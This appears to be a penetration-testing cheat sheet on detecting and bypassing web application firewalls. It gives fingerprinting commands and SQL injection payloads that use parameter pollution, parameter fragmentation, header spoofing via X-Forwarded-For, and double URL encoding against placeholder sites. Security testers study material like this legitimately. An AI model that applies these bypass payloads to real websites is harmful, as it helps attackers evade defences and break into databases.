WAFNINJA, COMODO WAF, MODSECURITY WAF, AQTRONIX WEBKNIGHT WAF, AQTRONIX WEBKNIGHT, AQTRONIX WEBKNIGHT


# nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com

# wafw00f example.com   

# whatwaf -u https://x.com




WAF Bypass contains many different workarounds, such as the following:

multiple URLEncode;

Base64Encode;

HTML Entity Encode;

UTF-8/16 Encode;

UTF-8 Text Collation;

multipart/form-boundary manipulation

using a specific method (HTTP method)

Request collation with different characters (null-byte, escaping etc.)


# BYPASSING PARAMETER VERIFICATION

• PHP removes whitespaces from parameter names or transforms them into underscores
http://www.website.com/products.php?%20productid=select 1,2,3
• ASP removes % character that is not followed by two hexadecimal digits
http://www.website.com/products.aspx?%productid=select 1,2,3
• A WAF which does not reject unknown parameters may be bypassed with this technique.

# X-* Headers
• WAF may be configured to trust certain internal IP Addresses
• Input validation is not applied on requests originating from these IPs
• If WAF retrieves these IPs from headers which can be changed by a user a bypass may occur
• A user is in control of the following HTTP Headers:
 X-Originating-IP

 X-Forwarded-For

 X-Remote-IP

 X-Remote-Addr

HTTP PARAMETER POLLUTION
• Sending a number of parameters with the same name

https://www.website.com/products/?productid=1&productid=2

• Technologies interpret this request differently:

Back end Behavior Processed

ASP.NET Concatenate with comma productid=1,2

JSP First Occurrence productid=1

PHP Last Occurrence productid=2


# The following payload can be divided:
• WAF sees two individual parameters and may not detect the payload
?productid=select 1,2,3 from table
• ASP.NET back end concatenates both values
?productid=select 1&productid=2,3 from table

# HTTP PARAMETER FRAGMENTATION
• Splitting subsequent code between different parameters
• Example query:
sql = "SELECT * FROM table WHERE uid = "+$_GET['uid']+" and pid = +$_GET[‘pid']“
• The following request:
http://www.website.com/index.php?uid=1+union/*&pid=*/select 1,2,3
would result in this SQL Query:
sql = "SELECT * FROM table WHERE uid = 1 union/* and pid = */select 1,2,3"

# DOUBLE URL ENCODING
• WAF normalizes URL encoded characters into ASCII text
• The WAF may be configured to decode characters only once
• Double URL Encoding a payload may result in a bypass
’s’ -> %73 -> %25%37%33
• The following payload contains a double URL encoded character
1 union %25%37%33elect 1,2,3

